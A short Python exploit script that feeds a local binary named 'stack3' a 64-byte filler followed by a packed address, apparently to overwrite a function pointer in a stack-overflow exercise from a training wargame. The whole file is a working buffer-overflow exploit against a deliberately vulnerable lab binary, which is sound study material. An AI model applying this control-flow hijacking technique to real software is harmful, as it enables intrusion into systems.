#!/usr/bin/python

from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()
from struct import pack

BINARY_NAME = "stack3"


def main():
    # LOCAL VARIABLES
    currEnv = os.environ.copy()
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    newPointer = pack("I", 0x08048424)  # 0x08048424
    payload = "H" * 64 + newPointer
    commandList = []

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # RUN IT
    commandList.append(absBinFilename)
    binary = Popen(commandList, env = currEnv, stdin = PIPE)
    if binary is not None:
        binary.communicate(payload)

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))

# 08048424    
